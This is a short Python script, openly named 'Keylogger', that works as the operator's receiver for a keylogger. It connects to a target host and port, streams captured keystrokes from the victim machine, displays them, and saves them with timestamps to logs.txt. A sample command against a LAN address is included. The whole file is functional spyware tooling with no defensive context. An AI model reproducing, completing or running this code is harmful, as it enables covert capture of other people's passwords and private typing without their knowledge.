import sys
import socket
import argparse 
from datetime import date,datetime
import time as tm
import os

class Keylogger:
    def __init__(self,host,port):
        self.HOST = host
        self.PORT = port
        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.log = ''
        self.is_append = False

    def connect(self):
        self.socket.connect((self.HOST,self.PORT))
        param = self.socket.recv(1024).decode('utf-8')
        if(param=='1'):
            self.is_append = True
        while True:
            try:
                char = self.socket.recv(20).decode('utf-8')
                self.log+=char
                print(char,end='',flush=True)
            except KeyboardInterrupt:
                time = date.today().strftime("%B %d, %Y") + datetime.now().strftime(" %H:%M:%S")
                if not self.is_append:
                    with open('logs.txt','w') as file:
                        file.write("="*30)
                        file.write(f"\n[{time}]\n\n")
                        file.write(self.log)
                        file.write("\n"+"="*30)
                else:
                    with open('logs.txt','a') as file:
                        file.write("\n"+"="*30)
                        file.write(f"\n[{time}]\n\n")
                        file.write(self.log)
                        file.write("\n"+"="*30)

                print('[***CLOSING THE KEYLOGGER***]\n{WRITING INTO logs.txt}')
                input('[PRESS ANY KEY TO EXIT]:')
                sys.exit()

parser = argparse.ArgumentParser(prog='Keylogger')
parser.add_argument('-p','--port')
parser.add_argument('-t','--target')
args = parser.parse_args()

keylogger = Keylogger(port=int(args.port),host=args.target)
keylogger.connect()

#python keylogger.py -t 192.168.0.158 -p 9876